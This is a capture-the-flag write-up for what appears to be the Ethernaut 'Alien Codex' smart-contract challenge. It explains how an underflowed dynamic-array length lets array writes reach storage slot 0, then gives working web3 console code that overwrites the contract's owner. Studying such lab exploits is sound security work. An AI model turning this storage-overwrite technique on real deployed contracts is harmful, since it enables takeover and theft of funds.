## This can be solved entirely on the ethernaut page via browser

First we'd need to understand the contract storage layout:

In the case of a dynamic array, the reserved slot p contains the length of the array as a uint256, and the array data itself is located sequentially at the address keccak256(p).
```
slot 0: owner, contact
slot 1: codex.length
// ...
slot keccak(1): codex[0]
slot keccak(1) + 1: codex[1]
slot keccak(1) + 2: codex[2]
slot keccak(1) + 3: codex[3]
slot keccak(1) + 4: codex[4]
// ...
```

Note that the array items wrap around after they reached the max storage slot of 2^256 - 1. Using a bit of math we can find the codex index that writes to the owner variable at storage slot 0:
```
need to find array index that maps to 0 mod 2^256
i.e., keccak(1) + index mod 2^256 = 0
<=> index = -keccak(1) mod 2^256
<=> index = 2^256 - keccak(1) as keccak(1) is in range
```

Code for solving this challenge:
```
// we need to call this function to pass the modifier to call other functions
await challenge.make_contact()

// by doing this, we can make it overflow to cover all the storage
await challenge.retract();

// getting the index in which to revise the data
p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
i = BigInt(2**256) - BigInt(p)

// generating the content to replace the owner address
// can use `await web3.eth.getStorageAt(contract.address, 0, console.log)` to check the existing value (includes both owner address and contact bool)
content = "0x" + "0".repeat(24) + player.slice(2) 

// finally, revise the data in the owner address slot
// by using the content above, we've also altered the contact boolean from true to false
await contract.revise(i, content)
```